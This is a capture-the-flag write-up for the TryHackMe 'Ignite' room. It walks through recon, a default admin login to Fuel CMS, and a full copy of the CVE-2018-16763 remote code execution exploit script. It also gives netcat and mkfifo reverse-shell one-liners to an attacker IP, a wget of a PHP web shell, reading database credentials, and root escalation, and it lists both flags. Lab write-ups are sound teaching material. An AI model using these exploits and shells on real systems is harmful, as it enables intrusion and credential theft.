---
description: 'https://tryhackme.com/room/ignite'
---

# Ignite

## INIT

```text
export ignite=10.10.28.158
ping $ignite

echo "10.10.28.158 ignite.thm" >> /etc/hosts
```

## NMAP

```text
nmap -sC -sV -O $ignite
```

![](../.gitbook/assets/image%20%28458%29.png)

## GOBUSTER

```text
gobuster dir -u $ignite -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt
```

![](../.gitbook/assets/image%20%28377%29.png)

## HTTP

![](../.gitbook/assets/image%20%28424%29.png)

![](../.gitbook/assets/image%20%28448%29.png)

![](../.gitbook/assets/image%20%28405%29.png)

{% hint style="info" %}
login: admin

password: admin
{% endhint %}

![](../.gitbook/assets/image%20%28421%29.png)

![](../.gitbook/assets/image%20%28376%29.png)

```text
searchsploit Fuel
searchsploit -p 47138
```

![](../.gitbook/assets/image%20%28443%29.png)

```text
cp /usr/share/exploitdb/exploits/linux/webapps/47138.py ignite.py
```

```text
# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib
import urllib.parse

url = "http://10.10.39.95"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
        xxxx = input('cmd:')
        burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
        proxy = {"http":"http://127.0.0.1:8080"}
        r = requests.get(burp0_url, proxies=proxy)

        html = "<!DOCTYPE html>"
        htmlcharset = r.text.find(html)

        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text,begin,2)

        print(r.text[0:dup])

```

![](../.gitbook/assets/image%20%28385%29.png)

```text
nc -e /bin/sh 10.14.4.204 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.4.204 4444 >/tmp
```

![](../.gitbook/assets/image%20%28417%29.png)

```text
cmd:bash shell.sh
```

![](../.gitbook/assets/image%20%28440%29.png)

```text
python3 ignite.py
wget http://10.14.4.204:8000/phpbash.php
```

![](../.gitbook/assets/image%20%28413%29.png)

![](../.gitbook/assets/image%20%28428%29.png)

![](../.gitbook/assets/image%20%28397%29.png)

![](../.gitbook/assets/image%20%28433%29.png)

### User.txt

{% hint style="success" %}
6470e394cbf6dab6a91682cc8585059b
{% endhint %}

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](../.gitbook/assets/image%20%28427%29.png)

```text
 cat /var/www/html/fuel/application/config/database.php
```

![](../.gitbook/assets/image%20%28444%29.png)

```text
su -
password: mememe
cat /root/root.txt
```

![](../.gitbook/assets/image%20%28423%29.png)

### Root.txt

{% hint style="success" %}
b9bbcb33e11b80be759c4e844862482d
{% endhint %}

